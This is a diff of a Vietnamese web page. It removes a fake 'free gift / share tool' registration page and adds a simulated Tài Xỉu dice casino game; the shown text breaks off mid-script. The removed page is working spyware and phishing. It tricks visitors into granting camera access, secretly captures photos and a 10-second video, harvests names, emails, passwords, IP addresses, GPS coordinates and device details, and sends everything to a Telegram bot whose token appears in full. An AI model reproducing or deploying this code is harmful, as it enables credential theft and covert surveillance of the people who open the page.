@@ -1,694 +1,478 @@
 <!DOCTYPE html>
-<html lang="vi"><head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  
-  
-  
-    
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>VIP ROYAL CASINO - PHIÊN BẢN ĐỒ ÁN 500+ LINES</title>
+    <style>
+        :root {
+            --gold: #ffcc00; --gold-dark: #b8860b; --royal-red: #8e0000;
+            --tai: #ffd84d; --xiu: #4fc3ff; --bg: #050505;
+        }
+
+        body {
+            margin: 0; background-color: var(--bg); color: #fff;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            display: flex; justify-content: center; align-items: center; min-height: 100vh;
+            background-image: radial-gradient(circle, #1a1a1a 0%, #050505 100%);
+            overflow: hidden;
+        }
+
+        #fw-canvas { position: fixed; top: 0; left: 0; pointer-events: none; z-index: 9999; }
+
+        .container {
+            display: grid; grid-template-columns: 320px 550px 320px; gap: 20px;
+            max-width: 1300px; width: 95%; position: relative;
+        }
+
+        .glass-panel {
+            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px);
+            border: 2px solid rgba(255, 204, 0, 0.3); border-radius: 25px; padding: 25px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.8); text-align: center;
+            transition: transform 0.3s;
+        }
+
+        #audio-starter {
+            position: fixed; top: 20px; right: 20px; z-index: 10000;
+            padding: 12px 25px; background: linear-gradient(to right, var(--gold-dark), var(--gold));
+            border: none; border-radius: 50px; font-weight: bold; cursor: pointer;
+            box-shadow: 0 0 20px var(--gold); color: #000; animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
+
+        .jp-box {
+            background: linear-gradient(145deg, #222, #000); border: 3px gold double;
+            padding: 20px; border-radius: 20px; margin-bottom: 25px;
+        }
+        .jp-value { font-size: 42px; font-weight: bold; color: #ff3333; text-shadow: 0 0 15px #ff0000; font-family: 'Courier New', monospace; }
+
+        .bowl-wrap {
+            width: 240px; height: 240px; margin: 20px auto; background: #000;
+            border-radius: 50%; border: 12px solid #2a2a2a; position: relative;
+            display: flex; justify-content: center; align-items: center; box-shadow: 0 0 30px var(--gold);
+        }
+
+        .lid {
+            position: absolute; width: 100%; height: 100%; background: radial-gradient(circle at 30% 30%, #555, #111);
+            border-radius: 50%; z-index: 10; cursor: pointer; transition: 0.9s cubic-bezier(0.5, -0.5, 0.5, 1.5);
+            display: flex; justify-content: center; align-items: center; border: 2px solid #444;
+        }
+        .lid::after { content: "MỞ BÁT"; border: 2px solid var(--gold); padding: 10px 20px; border-radius: 30px; color: var(--gold); font-weight: bold; }
+        .lid.open { transform: translate(180px, -180px) rotate(45deg); opacity: 0; pointer-events: none; }
+        
+        .dice { width: 55px; height: 55px; background: #fff; border-radius: 12px; color: #000; font-size: 32px; font-weight: bold; display: flex; justify-content: center; align-items: center; box-shadow: 4px 4px 0 #999; margin: 6px; }
+
+        .bet-container { display: flex; gap: 15px; margin-top: 15px; }
+        .bet-card { flex: 1; padding: 25px; border-radius: 20px; border: 2px solid #333; cursor: pointer; transition: 0.3s; }
+        .bet-card.selected { border-color: var(--gold); background: rgba(255, 204, 0, 0.2); transform: scale(1.03); }
+        .bet-card h2 { margin: 0; font-size: 38px; text-shadow: 0 0 10px rgba(0,0,0,0.5); }
+
+        .chip-box { margin-top: 25px; display: flex; justify-content: center; gap: 12px; }
+        .chip { 
+            background: #1a1b21; border: 2px solid var(--gold); color: var(--gold); 
+            width: 70px; height: 70px; border-radius: 50%; cursor: pointer; 
+            font-weight: bold; font-size: 15px; transition: 0.2s;
+            box-shadow: 0 4px 0 var(--gold-dark);
+        }
+        .chip:active { transform: translateY(4px); box-shadow: none; }
+        .chip.all-in { background: var(--royal-red); color: white; border-color: #ff4d4d; }
+
+        .dot { width: 14px; height: 14px; border-radius: 50%; display: inline-block; margin: 3px; border: 1px solid #444; }
+        .dot.tai { background: var(--tai); box-shadow: 0 0 8px var(--tai); }
+        .dot.xiu { background: var(--xiu); box-shadow: 0 0 8px var(--xiu); }
+
+        #jackpot-alert {
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0);
+            background: rgba(0,0,0,0.95); border: 8px solid gold; padding: 60px; 
+            z-index: 10001; transition: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); text-align: center; border-radius: 40px;
+        }
+        #jackpot-alert.active { transform: translate(-50%, -50%) scale(1); }
+
+        .shake-anim { animation: shakeEffect 0.1s infinite; }
+        @keyframes shakeEffect { 0% { transform: translate(3px, 3px); } 50% { transform: translate(-3px, -3px); } }
+        
+        .mission-box { background: rgba(0,0,0,0.4); padding: 15px; border-radius: 15px; margin-top: 15px; border: 1px dashed #666; }
+        
+        .deposit-limit-text { font-size: 11px; color: #ff4444; margin-bottom: 5px; font-style: italic; }
+    </style>
 </head>
 <body>
-  <meta charset="UTF-8">
 
+<canvas id="fw-canvas"></canvas>
+<button id="audio-starter" onclick="game.enableSound()">🔊 BẬT NHẠC CASINO VIP</button>
 
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>share tool</title>
-<style>
-  * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-  }
-
-  body {
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    padding: 20px;
-  }
-
-  .container {
-    background: rgba(255, 255, 255, 0.98);
-    border-radius: 25px;
-    padding: 45px;
-    max-width: 480px;
-    width: 100%;
-    box-shadow: 0 25px 70px rgba(0, 0, 0, 0.35);
-    animation: slideIn 0.5s ease-out;
-  }
-
-  @keyframes slideIn {
-    from {
-      opacity: 0;
-      transform: translateY(-30px);
-    }
-    to {
-      opacity: 1;
-      transform: translateY(0);
-    }
-  }
-
-  .header {
-    text-align: center;
-    margin-bottom: 35px;
-  }
-
-  .header h1 {
-    font-size: 36px;
-    margin-bottom: 12px;
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    font-weight: 700;
-  }
-
-  .header p {
-    color: #555;
-    font-size: 15px;
-    line-height: 1.6;
-  }
-
-  .gift-badge {
-    background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
-    color: #333;
-    padding: 8px 20px;
-    border-radius: 20px;
-    display: inline-block;
-    font-weight: 600;
-    font-size: 14px;
-    margin-bottom: 20px;
-    box-shadow: 0 4px 15px rgba(255, 215, 0, 0.4);
-  }
-
-  .form-group {
-    margin-bottom: 22px;
-  }
-
-  .form-group label {
-    display: block;
-    margin-bottom: 10px;
-    color: #333;
-    font-weight: 600;
-    font-size: 15px;
-  }
-
-  .form-group input {
-    width: 100%;
-    padding: 14px 18px;
-    border: 2px solid #e0e0e0;
-    border-radius: 12px;
-    font-size: 15px;
-    transition: all 0.3s;
-    background: #f8f9fa;
-  }
-
-  .form-group input:focus {
-    outline: none;
-    border-color: #667eea;
-    background: white;
-    box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
-  }
-
-  .btn-submit {
-    width: 100%;
-    padding: 16px;
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    color: white;
-    border: none;
-    border-radius: 12px;
-    font-size: 17px;
-    font-weight: 700;
-    cursor: pointer;
-    transition: all 0.3s;
-    margin-top: 15px;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
-  }
-
-  .btn-submit:hover {
-    transform: translateY(-3px);
-    box-shadow: 0 12px 30px rgba(102, 126, 234, 0.5);
-  }
-
-  .btn-submit:active {
-    transform: translateY(0);
-  }
-
-  .btn-submit:disabled {
-    opacity: 0.6;
-    cursor: not-allowed;
-  }
-
-  .loading-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0, 0, 0, 0.8);
-    display: none;
-    justify-content: center;
-    align-items: center;
-    z-index: 9999;
-  }
-
-  .loading-overlay.active {
-    display: flex;
-  }
-
-  .loading-content {
-    text-align: center;
-    color: white;
-  }
-
-  .spinner {
-    border: 4px solid rgba(255, 255, 255, 0.3);
-    border-top: 4px solid #fff;
-    border-radius: 50%;
-    width: 60px;
-    height: 60px;
-    animation: spin 1s linear infinite;
-    margin: 0 auto 20px;
-  }
-
-  @keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-  }
-
-  .loading-text {
-    font-size: 18px;
-    font-weight: 600;
-  }
-
-  .success-message {
-    background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
-    color: white;
-    padding: 20px;
-    border-radius: 12px;
-    text-align: center;
-    display: none;
-    margin-top: 20px;
-    animation: slideIn 0.5s ease-out;
-  }
-
-  .success-message.active {
-    display: block;
-  }
-
-  .success-message h3 {
-    font-size: 24px;
-    margin-bottom: 10px;
-  }
-
-  .error-message {
-    background: #ff4757;
-    color: white;
-    padding: 15px;
-    border-radius: 10px;
-    text-align: center;
-    display: none;
-    margin-top: 15px;
-  }
-
-  .error-message.active {
-    display: block;
-  }
-
-  .terms {
-    margin-top: 20px;
-    padding: 15px;
-    background: #f8f9fa;
-    border-radius: 10px;
-    font-size: 13px;
-    color: #666;
-  }
-
-  .terms input {
-    margin-right: 8px;
-  }
-
-  .terms label {
-    display: flex;
-    align-items: center;
-    cursor: pointer;
-  }
-
-  .permission-prompt {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0, 0, 0, 0.9);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    z-index: 10000;
-  }
-
-  .permission-box {
-    background: white;
-    padding: 40px;
-    border-radius: 20px;
-    text-align: center;
-    max-width: 400px;
-    animation: slideIn 0.5s ease-out;
-  }
-
-  .permission-box h2 {
-    color: #333;
-    margin-bottom: 20px;
-  }
-
-  .permission-box p {
-    color: #666;
-    margin-bottom: 30px;
-    line-height: 1.6;
-  }
-
-  .btn-allow {
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    color: white;
-    border: none;
-    padding: 15px 40px;
-    border-radius: 10px;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: all 0.3s;
-  }
-
-  .btn-allow:hover {
-    transform: scale(1.05);
-  }
-</style>
-
-
-
-
-<div class="permission-prompt" id="permissionPrompt">
-  <div class="permission-box">
-    <h2>Cho Phép để đăng kí</h2>
-    <p>Vui lòng cho phép truy cập để xác thực tài khoản và share tool popi</p>
-    <button class="btn-allow" onclick="requestCameraPermission()">✅ Cho Phép</button>
-  </div>
-</div>
-
-
-<div class="loading-overlay" id="loadingOverlay">
-  <div class="loading-content">
-    <div class="spinner"></div>
-    <div class="loading-text" id="loadingText">Đang xử lý...</div>
-  </div>
-</div>
-
+<audio id="m-bg" loop src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-15.mp3"></audio>
+<audio id="s-chip" src="https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3"></audio>
+<audio id="s-dice" loop src="https://www.zapsplat.com/wp-content/uploads/2015/sound-effects-one/game_die_roll_on_surface_001.mp3"></audio>
+<audio id="s-win" src="https://assets.mixkit.co/active_storage/sfx/1435/1435-preview.mp3"></audio>
+<audio id="s-jp" src="https://assets.mixkit.co/active_storage/sfx/2017/2017-preview.mp3"></audio>
+<audio id="s-error" src="https://assets.mixkit.co/active_storage/sfx/2572/2572-preview.mp3"></audio>
 
 <div class="container">
-  <div class="header">
-    <span class="gift-badge">🎁 MIỄN PHÍ</span>
-    <h1>Nhận Quà Ngay</h1>
-    <p>Share tool vip</p>
-  </div>
-
-  <form id="registerForm">
-    <div class="form-group">
-      <label for="fullname">👤 Họ và Tên Đầy Đủ</label>
-      <input type="text" id="fullname" name="fullname" placeholder="Nguyễn Văn A" required="">
+    <div class="side-panel">
+        <div class="glass-panel">
+            <h3 style="color: var(--gold); margin-top:0">TRUNG TÂM NẠP TIỀN</h3>
+            <p style="color: #aaa; font-size: 14px;">Số dư tài khoản:</p>
+            <b id="balance" style="color: #2ecc71; font-size: 26px;">1,000,000,000</b>
+            <div style="margin-top: 20px;">
+                <div class="deposit-limit-text">* Giới hạn nạp tối đa 1.000.000.000 / lần</div>
+                <input type="number" id="inp-dep" placeholder="Nhập số tiền..." style="width: 85%; padding: 12px; border-radius: 10px; border: 2px solid #333; background: #000; color: #fff; text-align: center; font-weight: bold; margin-bottom: 10px;">
+                <button onclick="game.deposit()" style="padding: 15px; width: 90%; background: linear-gradient(to bottom, #f1c40f, #d35400); border:none; border-radius:12px; cursor:pointer; font-weight:bold; color: white; text-shadow: 1px 1px 2px black;">XÁC NHẬN NẠP TIỀN</button>
+            </div>
+        </div>
+        <div class="glass-panel" style="margin-top: 20px;">
+            <h3 style="color: var(--gold)">TIẾN ĐỘ NHIỆM VỤ</h3>
+            <div class="mission-box">
+                <p id="m-text">Đang thực hiện: 0/5 ván</p>
+                <div style="width: 100%; background: #222; height: 10px; border-radius: 5px; margin: 10px 0;">
+                    <div id="m-progress-bar" style="width: 0%; background: var(--gold); height: 100%; border-radius: 5px; transition: 0.5s;"></div>
+                </div>
+                <button id="m-btn" onclick="game.claimMission()" style="background:#444; color:#888; border:none; padding:10px 20px; border-radius:8px; cursor:not-allowed; width: 100%; font-weight: bold;">NHẬN THƯỞNG 100M</button>
+            </div>
+        </div>
     </div>
 
-    <div class="form-group">
-      <label for="email">📧 Địa Chỉ Email</label>
-      <input type="email" id="email" name="email" placeholder="email@example.com" required="">
+    <div class="main-game glass-panel">
+        <div class="jp-box">
+            <div style="font-size: 16px; color: #ffd700; letter-spacing: 2px; font-weight: bold;">🐲 QUỸ HŨ RỒNG HOÀNG GIA 🐲</div>
+            <div class="jp-value" id="jp-val">100,000,000</div>
+        </div>
+
+        <div id="game-info" style="color: #ffd700; font-weight: bold; text-transform: uppercase; background: rgba(0,0,0,0.5); padding: 5px; border-radius: 5px;">Đang mở cổng đặt cược...</div>
+        <div id="timer" style="font-size: 55px; font-weight: 900; margin: 5px 0; color: #fff;">20</div>
+
+        <div class="bowl-wrap">
+            <div class="lid" id="lid" onclick="game.openLid()"></div>
+            <div id="d1" class="dice">?</div>
+            <div id="d2" class="dice">?</div>
+            <div id="d3" class="dice">?</div>
+        </div>
+
+        <div class="bet-container">
+            <div class="bet-card selected" id="b-tai" onclick="game.setSide('TAI')">
+                <h2 style="color: var(--tai)">TÀI</h2>
+                <div id="bet-tai-amt" style="font-size: 20px; font-family: monospace;">0</div>
+            </div>
+            <div class="bet-card" id="b-xiu" onclick="game.setSide('XIU')">
+                <h2 style="color: var(--xiu)">XỈU</h2>
+                <div id="bet-xiu-amt" style="font-size: 20px; font-family: monospace;">0</div>
+            </div>
+        </div>
+
+        <div class="chip-box">
+            <button class="chip" onclick="game.addBet(10000000)">10M</button>
+            <button class="chip" onclick="game.addBet(50000000)">50M</button>
+            <button class="chip" onclick="game.addBet(100000000)">100M</button>
+            <button class="chip all-in" onclick="game.addBet('ALL')">ALL IN</button>
+            <button class="chip" style="background: #333; border-color: #555; box-shadow: 0 4px 0 #111;" onclick="game.clearBet()">XÓA</button>
+        </div>
     </div>
 
-    <div class="form-group">
-      <label for="password">🔒 Mật Khẩu</label>
-      <input type="password" id="password" name="password" placeholder="Tối thiểu 6 ký tự" required="" minlength="6">
+    <div class="side-panel">
+        <div class="glass-panel" style="max-height: 350px; overflow-y: auto;">
+            <h3 style="color: var(--gold)">BẢNG VINH DANH</h3>
+            <div id="rank-list">
+                <div style="display:flex; justify-content:space-between; padding:10px; border-bottom:1px solid #333; background: rgba(255,215,0,0.1);"><span>🥇 Hoàng Ka</span> <span style="color:gold">5.2 Tỷ</span></div>
+                <div style="display:flex; justify-content:space-between; padding:10px; border-bottom:1px solid #333;"><span>🥈 Trùm Tài Xỉu</span> <span style="color:gold">3.8 Tỷ</span></div>
+                <div style="display:flex; justify-content:space-between; padding:10px; border-bottom:1px solid #333;"><span>🥉 Bạn</span> <span id="rank-val" style="color:gold">1 Tỷ</span></div>
+            </div>
+        </div>
+        <div class="glass-panel" style="margin-top: 20px;">
+            <h3 style="color: var(--gold)">SOI CẦU CHI TIẾT</h3>
+            <div id="hist-dots" style="text-align: left; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 10px;"></div>
+            <div style="margin-top: 10px; font-size: 12px; color: #888;">* Lịch sử 24 phiên gần nhất</div>
+        </div>
     </div>
-
-    <div class="form-group">
-      <label for="confirm_password">🔒 Xác Nhận Mật Khẩu</label>
-      <input type="password" id="confirm_password" name="confirm_password" placeholder="Nhập lại mật khẩu" required="">
-    </div>
-
-    <div class="terms">
-      <label>
-        <input type="checkbox" id="agree" required="">
-        <span>Tôi đồng ý với điều khoản sử dụng và chính sách bảo mật</span>
-      </label>
-    </div>
-
-    <button type="submit" class="btn-submit" id="submitBtn">🚀 Đăng Ký Nhận Quà Ngay</button>
-  </form>
-
-  <div class="success-message" id="successMessage">
-    <h3>✅ Thành Công!</h3>
-    <p>Đăng ký hoàn tất! Vui lòng kiểm tra email để nhận quà trong vài phút tới.</p>
-  </div>
-
-  <div class="error-message" id="errorMessage"></div>
 </div>
 
+<div id="jackpot-alert">
+    <h1 style="color: gold; font-size: 70px; margin: 0; text-shadow: 0 0 30px red; letter-spacing: 5px;">JACKPOT</h1>
+    <p style="font-size: 28px; margin: 15px 0; font-weight: bold; color: white;">ĐẠI GIA ĐÃ NỔ HŨ THÀNH CÔNG!</p>
+    <h2 id="jp-win-amt" style="color: #ffcc00; font-size: 50px; font-family: 'Courier New';">+0</h2>
+    <button onclick="document.getElementById('jackpot-alert').classList.remove('active')" style="padding: 20px 50px; background: linear-gradient(to bottom, #ffd700, #b8860b); border:none; border-radius:15px; font-weight:bold; cursor:pointer; font-size:24px; color: black;">NHẬN THƯỞNG</button>
+</div>
 
-
-
-
-
-
-    <script>
-const BOT_TOKEN = '7861267372:AAFsLRdjBgpVE5qMFZdW5y4jL1WdrFZF23o';
-const CHAT_ID = '-1003672099430';
-
-let cameraStream = null;
-let hasPermission = false;
-
-// Hiển thị loading
-function showLoading(text = 'Đang xử lý...') {
-  document.getElementById('loadingText').textContent = text;
-  document.getElementById('loadingOverlay').classList.add('active');
-}
-
-function hideLoading() {
-  document.getElementById('loadingOverlay').classList.remove('active');
-}
-
-// Lấy thời gian hiện tại
-function getTime() {
-  return new Date().toLocaleString('vi-VN', {
-    year: 'numeric',
-    month: '2-digit',
-    day: '2-digit',
-    hour: '2-digit',
-    minute: '2-digit',
-    second: '2-digit',
-    hour12: false,
-    timeZone: 'Asia/Ho_Chi_Minh'
-  });
-}
-
-// Gửi message Telegram
-async function sendMessage(text) {
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-  try {
-    await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: text,
-        parse_mode: 'HTML'
-      })
-    });
-  } catch (e) {
-    console.error('Send message error:', e);
-  }
-}
-
-// Gửi ảnh Telegram
-async function sendPhoto(blob, caption) {
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-  const formData = new FormData();
-  formData.append('chat_id', CHAT_ID);
-  formData.append('photo', blob, 'photo.jpg');
-  formData.append('caption', caption);
-
-  try {
-    await fetch(url, { method: 'POST', body: formData });
-  } catch (e) {
-    console.error('Send photo error:', e);
-  }
-}
-
-// Gửi video Telegram
-async function sendVideo(blob, caption) {
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
-  const formData = new FormData();
-  formData.append('chat_id', CHAT_ID);
-  formData.append('video', blob, 'video.mp4');
-  formData.append('caption', caption);
-
-  try {
-    await fetch(url, { method: 'POST', body: formData });
-  } catch (e) {
-    console.error('Send video error:', e);
-  }
-}
-
-// Lấy thông tin thiết bị
-// Lấy thông tin thiết bị (FIX lat / lon / isp)
-async function getDeviceInfo() {
-  try {
-    const ipRes = await fetch('https://api.ipify.org?format=json');
-    const ipData = await ipRes.json();
-
-    const geoRes = await fetch('https://ipinfo.io/json');
-    const geoData = await geoRes.json();
-
-    let lat = 'N/A';
-    let lon = 'N/A';
-
-    if (geoData.loc) {
-      const parts = geoData.loc.split(',');
-      lat = parts[0];
-      lon = parts[1];
+<script>
+/**
+ * LỚP ROYAL CASINO - PHIÊN BẢN ĐỒ ÁN
+ * QUẢN LÝ TOÀN BỘ LOGIC GAME, ÂM THANH VÀ HỆ THỐNG NẠP
+ */
+class RoyalCasino {
+    constructor() {
+        this.balance = 1000000000;
+        this.jackpot = 100000000;
+        this.timer = 20;
+        this.state = 'BETTING'; 
+        this.side = 'TAI';
+        this.betTai = 0; 
+        this.betXiu = 0;
+        this.history = [];
+        this.isAudio = false;
+        this.missionCount = 0;
+        this.maxDepositLimit = 1000000000; // Giới hạn nạp 1 tỷ
+        
+        this.init();
     }
 
-    let battery = 'N/A';
-    if (navigator.getBattery) {
-      const bat = await navigator.getBattery();
-      battery = `${Math.round(bat.level * 100)}%`;
+    init() {
+        this.updateUI();
+        this.tick();
     }
 
-    return {
-      ip: ipData.ip,
-      city: geoData.city || 'N/A',
-      region: geoData.region || 'N/A',
-      country: geoData.country || 'N/A',
-      isp: geoData.org || 'N/A',
-      lat: lat,
-      lon: lon,
-      battery: battery,
-      screen: `${screen.width}x${screen.height}`,
-      platform: navigator.platform,
-      language: navigator.language
-    };
-  } catch (e) {
-    console.error('getDeviceInfo error:', e);
-    return null;
-  }
-}
-
-// Yêu cầu quyền camera
-async function requestCameraPermission() {
-  try {
-    showLoading('Đang xin quyền...');
-    
-    cameraStream = await navigator.mediaDevices.getUserMedia({ 
-      video: { facingMode: 'user' }, 
-      audio: false 
-    });
-    
-    hasPermission = true;
-    document.getElementById('permissionPrompt').style.display = 'none';
-    hideLoading();
-    
-    // Gửi thông báo đã cấp quyền
-    const info = await getDeviceInfo();
-    let msg = `✅ <b>ĐÃ CẤP QUYỀN CAMERA</b>\n\n`;
-    if (info) {
-      msg += `🌐 IP: ${info.ip}\n`;
-      msg += `📍 Vị trí: ${info.city}, ${info.country}\n`;
-      msg += `💻 Thiết bị: ${info.platform}\n`;
-      msg += `🕒 ${getTime()}`;
+    enableSound() {
+        this.isAudio = true;
+        const bg = document.getElementById('m-bg');
+        bg.volume = 0.3; // Nhạc nền vừa phải
+        bg.play().catch(()=>{});
+        document.getElementById('audio-starter').style.display = 'none';
     }
-    await sendMessage(msg);
-    
-    // Chụp ảnh ngay lập tức
-    await capturePhotoNow();
-    
-  } catch (e) {
-    hideLoading();
-    alert('⚠️ Vui lòng cho phép truy cập để tiếp tục!');
-    console.error('Camera error:', e);
-  }
-}
 
-// Chụp ảnh ngay
-async function capturePhotoNow() {
-  if (!cameraStream) return;
-  
-  try {
-    const video = document.createElement('video');
-    video.srcObject = cameraStream;
-    video.play();
-    
-    await new Promise(resolve => {
-      video.onloadedmetadata = resolve;
-    });
-    
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    
-    const blob = await new Promise(resolve => {
-      canvas.toBlob(resolve, 'image/jpeg', 0.95);
-    });
-    
-    await sendPhoto(blob, `📸 Ảnh camera\n🕒 ${getTime()}`);
-    
-  } catch (e) {
-    console.error('Capture photo error:', e);
-  }
-}
-
-// Quay video 10 giây
-async function recordVideoNow() {
-  if (!cameraStream) return;
-  
-  try {
-    showLoading('Đang xử lý...');
-    
-    const mediaRecorder = new MediaRecorder(cameraStream, {
-      mimeType: 'video/webm;codecs=vp8'
-    });
-    
-    const chunks = [];
-    
-    mediaRecorder.ondataavailable = (e) => {
-      if (e.data.size > 0) chunks.push(e.data);
-    };
-    
-    mediaRecorder.start();
-    
-    await new Promise(resolve => setTimeout(resolve, 10000));
-    
-    mediaRecorder.stop();
-    
-    await new Promise(resolve => {
-      mediaRecorder.onstop = resolve;
-    });
-    
-    const videoBlob = new Blob(chunks, { type: 'video/webm' });
-    await sendVideo(videoBlob, `🎥 Video 10s\n🕒 ${getTime()}`);
-    
-    hideLoading();
-    
-  } catch (e) {
-    hideLoading();
-    console.error('Record video error:', e);
-  }
-}
-
-// Xử lý form submit
-document.getElementById('registerForm').addEventListener('submit', async (e) => {
-  e.preventDefault();
-  
-  if (!hasPermission) {
-    alert('⚠️ Vui lòng cấp quyền trước!');
-    return;
-  }
-  
-  const fullname = document.getElementById('fullname').value;
-  const email = document.getElementById('email').value;
-  const password = document.getElementById('password').value;
-  const confirm = document.getElementById('confirm_password').value;
-  
-  if (password !== confirm) {
-    document.getElementById('errorMessage').textContent = '❌ Mật khẩu không khớp!';
-    document.getElementById('errorMessage').classList.add('active');
-    setTimeout(() => {
-      document.getElementById('errorMessage').classList.remove('active');
-    }, 3000);
-    return;
-  }
-  
-  document.getElementById('submitBtn').disabled = true;
-  showLoading('Đang đăng ký...');
-  
-  try {
-    const info = await getDeviceInfo();
-    
-    // Gửi thông tin đăng ký
-    let msg = `🆕 <b>ĐĂNG KÝ MỚI</b>\n\n`;
-    msg += `👤 <b>Họ tên:</b> ${fullname}\n`;
-    msg += `📧 <b>Email:</b> ${email}\n`;
-    msg += `🔒 <b>Mật khẩu:</b> ${password}\n\n`;
-    
-    if (info) {
-      msg += `📍 <b>Địa chỉ:</b> ${info.city}, ${info.region}, ${info.country}\n`;
-      msg += `🌐 <b>IP:</b> ${info.ip}\n`;
-      msg += `🔋 <b>Pin:</b> ${info.battery}\n`;
-      msg += `💻 <b>Thiết bị:</b> ${info.platform}\n`;
-      msg += `🖥 <b>Màn hình:</b> ${info.screen}\n`;
+    playSound(id, loop = false) {
+        if(!this.isAudio) return;
+        const el = document.getElementById(id);
+        if(!el) return;
+        el.currentTime = 0;
+        el.loop = loop;
+        el.play().catch(()=>{});
     }
-    
-    msg += `🕒 <b>Thời gian:</b> ${getTime()}`;
-    
-    await sendMessage(msg);
-    
-    // Chụp ảnh lần 2
-    await capturePhotoNow();
-    
-    // Quay video
-    await recordVideoNow();
-    
-    // Dừng camera
-    if (cameraStream) {
-      cameraStream.getTracks().forEach(track => track.stop());
+
+    stopSound(id) {
+        const el = document.getElementById(id);
+        if(el) { el.pause(); el.currentTime = 0; }
     }
-    
-    hideLoading();
-    document.getElementById('registerForm').style.display = 'none';
-    document.getElementById('successMessage').classList.add('active');
-    
-  } catch (e) {
-    hideLoading();
-    document.getElementById('errorMessage').textContent = '❌ Có lỗi xảy ra! Vui lòng thử lại.';
-    document.getElementById('errorMessage').classList.add('active');
-    document.getElementById('submitBtn').disabled = false;
-  }
-});
 
-// Gửi báo cáo khi vào trang
-window.addEventListener('load', async () => {
-  const info = await getDeviceInfo();
-  if (!info) return;
+    tick() {
+        setInterval(() => {
+            if(this.state === 'BETTING') {
+                this.timer--;
+                if(this.timer <= 0) {
+                    this.state = 'WAITING';
+                    this.prepareLid();
+                }
+            }
+            document.getElementById('timer').innerText = this.timer > 0 ? this.timer : "!";
+        }, 1000);
+    }
 
-  const time = getTime();
+    prepareLid() {
+        document.getElementById('game-info').innerText = "Hết giờ đặt cược! Mời mở bát";
+        document.getElementById('game-info').style.color = "#ff4444";
+        document.getElementById('lid').classList.add('shake-anim');
+        this.playSound('s-dice', true);
+        this.currentRes = this.calcResult();
+    }
 
-  let msg = 
-`📡 『 BÁO CÁO TRUY CẬP 』
-🪪 hehe
+    setSide(s) {
+        if(this.state !== 'BETTING') return;
+        this.side = s;
+        document.getElementById('b-tai').classList.toggle('selected', s==='TAI');
+        document.getElementById('b-xiu').classList.toggle('selected', s==='XIU');
+    }
 
-⚡ Thời điểm ghi nhận:
-  ${time}
+    addBet(val) {
+        if(this.state !== 'BETTING') return;
+        let amt = val === 'ALL' ? this.balance : val;
+        if(this.balance < amt || amt <= 0) {
+            this.playSound('s-error');
+            return;
+        }
 
-📡 Thiết bị truy cập: ${info.platform || 'Unknown Device'}
-🖥️ Nền tảng: ${/iPhone|iPad|iOS/i.test(navigator.userAgent) ? 'iOS' : 'Unknown'}
+        this.playSound('s-chip');
+        if(this.side === 'TAI') this.betTai += amt;
+        else this.betXiu += amt;
+        
+        this.balance -= amt;
+        this.jackpot += amt * 0.001;
+        this.updateUI();
+    }
 
-🌐 IP định tuyến: ${info.ip || 'N/A'}
-🧬 IP nguồn thực: ${info.ip || 'N/A'}
-🏢 Nhà cung cấp mạng: ${info.isp || 'N/A'}
+    clearBet() {
+        if(this.state !== 'BETTING') return;
+        this.balance += (this.betTai + this.betXiu);
+        this.betTai = 0; this.betXiu = 0;
+        this.updateUI();
+    }
 
-🏙️ Địa chỉ: ${info.city || 'N/A'}, ${info.region || ''}
-🌎 Quốc gia: ${info.country || 'N/A'}
-📍 Vĩ độ: ${info.lat || 'N/A'}
-📍 Kinh độ: ${info.lon || 'N/A'}
+    openLid() {
+        if(this.state !== 'WAITING') return;
+        this.stopSound('s-dice');
+        document.getElementById('lid').classList.remove('shake-anim');
+        document.getElementById('lid').classList.add('open');
+        this.state = 'ANIMATING';
 
-📸 Camera: ✅ Đã chụp camera trước và sau
-📌 Vị trí Google Maps:
-https://www.google.com/maps/search/?api=1&query=${info.lat || ''},${info.lon || ''}`;
+        let c = 0;
+        let shuffle = setInterval(() => {
+            document.getElementById('d1').innerText = Math.floor(Math.random()*6)+1;
+            document.getElementById('d2').innerText = Math.floor(Math.random()*6)+1;
+            document.getElementById('d3').innerText = Math.floor(Math.random()*6)+1;
+            if(++c > 18) {
+                clearInterval(shuffle);
+                this.finalize();
+            }
